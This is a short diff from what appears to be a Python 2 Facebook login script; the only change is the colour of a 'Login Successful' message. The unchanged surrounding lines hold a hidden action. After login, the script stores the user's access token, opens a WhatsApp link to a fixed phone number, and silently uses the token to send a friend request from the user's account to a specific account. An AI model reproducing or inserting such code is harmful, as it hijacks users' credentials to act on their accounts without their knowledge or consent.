@@ -143,7 +143,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;36;40m[✓] Login Successful...'
+				print '\n\x1b[1;32;40m[✓] Login Successful...'
 				os.system('xdg-open https://wa.me/6282282143238')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
